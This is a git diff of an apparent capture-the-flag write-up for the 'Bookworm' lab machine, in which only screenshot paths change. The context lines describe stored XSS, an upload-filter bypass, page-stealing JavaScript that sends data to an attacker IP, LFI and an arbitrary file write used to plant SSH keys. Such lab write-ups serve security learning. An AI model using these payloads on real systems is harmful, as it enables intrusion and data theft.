@@ -21,7 +21,7 @@ Just two ports open. We have to add `bookworm.htb` to our `/etc/hosts` file to a
 
 Port 80 was an online bookstore site with books for sale:
 
-<figure><img src="../../.gitbook/assets/image (710).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (710) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can view the shop to find some books on sale:
 
@@ -51,7 +51,7 @@ I took note of the 'download books' option since it was removed. There was menti
 
 After updating the note and completing the checkout, I received a callback on our HTTP server.
 
-<figure><img src="../../.gitbook/assets/image (694).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (694) (2).png" alt=""><figcaption></figcaption></figure>
 
 So XSS was possible, but right now it's only viewable by us and we need to somehow figure out how to inject this into the cart of others. I took a look at the POST request made, and found that a number was used as the cart identifier:
 
@@ -59,15 +59,15 @@ So XSS was possible, but right now it's only viewable by us and we need to someh
 
 On a side note, I noticed that there were different usernames for the bot each time I refreshed the page:
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (10).png" alt=""><figcaption></figcaption></figure>
 
 Examining the page source reveals that there was some number associated with the updates:
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (8).png" alt=""><figcaption></figcaption></figure>
 
 This number incremented itself each time, and it was likely that this is the same number used for the cart ID, giving us an opportunity to inject XSS payloads into the cart of the bot. Apart from the checkout, viewing the user profile reveals that we can upload an avatar to the site:
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (10).png" alt=""><figcaption></figcaption></figure>
 
 We can try uploading some basic Javascript files (since this was likely an XSS-based initial access). After some trial and error, I found that by changing the `Content-Type` header to `image/jpeg`, we can bypass the content check and upload whatever we want.&#x20;
 
@@ -134,7 +134,7 @@ fetch("http://10.10.14.34/?profilebotcallback")
 
 When we refresh our `/profile` page, we can see that our image is located at a certain static directory:
 
-<figure><img src="../../.gitbook/assets/image (696).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (696) (1).png" alt=""><figcaption></figcaption></figure>
 
 After waiting for a bit, we would eventually get a callback using this method:
 
@@ -144,7 +144,7 @@ There was mention of 'old orders' being used, so I wanted to see if we could ste
 
 To do this, we can create a Flask server to redirect the bot to other pages. The `/profile` endpoint had an Order History record at the bottom:
 
-<figure><img src="../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (530) (2).png" alt=""><figcaption></figcaption></figure>
 
 So the exploit path is to redirect the bot to their own `/profile` directory and view their old orders via injecting Javascript code into our profile picture.
 
@@ -165,7 +165,7 @@ xhr.send(null);
 
 The above payload doesn't work, but we can at least confirm that page stealing is the way to go:
 
-<figure><img src="../../.gitbook/assets/image (705).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (705) (1).png" alt=""><figcaption></figcaption></figure>
 
 I took a break from this machine while waiting for it to be hosted on the SG VPN for stability (so that's why the IP addresses are different later). Afterwards, I edited the Javascript code a bit to wait for the page to load before sending me the contents:
 
@@ -181,7 +181,7 @@ stealpage("http://bookworm.htb/profile")
 
 Afterwards, I would get a callback with a huge base64 encoded string at the back:
 
-<figure><img src="../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (495) (2).png" alt=""><figcaption></figcaption></figure>
 
 Here's the interseting part of the page decoded:
 
@@ -352,7 +352,7 @@ It seems that this requires a `database.js` file to be run. So, we can read `/pr
 
 Then, we can `ssh` in using `frank` as the username.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (703).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (703) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -425,7 +425,7 @@ udp        0      0 0.0.0.0:68              0.0.0.0:*                           
 
 We can forward this using `chisel` and view the site:
 
-<figure><img src="../../.gitbook/assets/image (690).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (690) (1).png" alt=""><figcaption></figcaption></figure>
 
 I found the documentation for this application here:
 
@@ -441,7 +441,7 @@ I played around with the `outputType` variable and tried LFI again, and it worke
 
 Within the machine, it creates this file with `neil` permissions:
 
-<figure><img src="../../.gitbook/assets/image (467).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (467) (2).png" alt=""><figcaption></figcaption></figure>
 
 This means we have an arbitrary file write as the `neil` user, and we can try to drop our SSH public key into his `authorized_keys` folder. I tried to directly write it to that folder but it doesn't work, and I think we have to maintain the `.txt` extension.
 
